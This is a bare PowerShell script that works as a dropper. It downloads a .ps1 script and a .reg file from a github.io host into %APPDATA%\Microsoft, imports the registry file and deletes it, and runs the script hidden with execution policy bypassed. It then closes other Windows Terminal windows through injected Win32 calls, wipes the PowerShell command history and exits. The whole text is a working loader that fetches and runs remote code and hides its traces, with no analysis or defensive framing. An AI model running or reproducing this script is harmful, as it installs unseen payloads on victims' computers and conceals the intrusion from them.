$p = [System.Environment]::GetFolderPath('ApplicationData')

Invoke-WebRequest -Uri 'https://lo9wroc.github.io/pr.ps1' -OutFile "$p\Microsoft\pr.ps1"

Invoke-WebRequest -Uri 'https://lo9wroc.github.io/pr.reg' -OutFile "$p\Microsoft\pr.reg"

reg import "$p\Microsoft\pr.reg"

Remove-Item "$p\Microsoft\pr.reg"

Start-Process powershell.exe -ArgumentList "-NoProfile -File `"$p\Microsoft\pr.ps1`""

cmd.exe /c start /min "" powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%APPDATA%\Microsoft\pr.ps1"

Add-Type -Name W -Namespace N -MemberDefinition 'public delegate bool P(IntPtr h,IntPtr l);[DllImport("user32.dll")]public static extern bool EnumWindows(P p,IntPtr l);[DllImport("user32.dll")]public static extern int GetClassName(IntPtr h,System.Text.StringBuilder s,int n);[DllImport("user32.dll")]public static extern bool PostMessage(IntPtr h,uint m,IntPtr w,IntPtr l);[DllImport("user32.dll")]public static extern IntPtr GetAncestor(IntPtr h,uint f);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();public static void X(){IntPtr me=GetAncestor(GetConsoleWindow(),3);EnumWindows((h,l)=>{var sb=new System.Text.StringBuilder(256);GetClassName(h,sb,256);if(sb.ToString()=="CASCADIA_HOSTING_WINDOW_CLASS"&&h!=me)PostMessage(h,0x10,IntPtr.Zero,IntPtr.Zero);return true;},IntPtr.Zero);}'; [N.W]::X()

Clear-History; Remove-Item (Get-PSReadLineOption).HistorySavePath -Force

[Environment]::Exit(0)
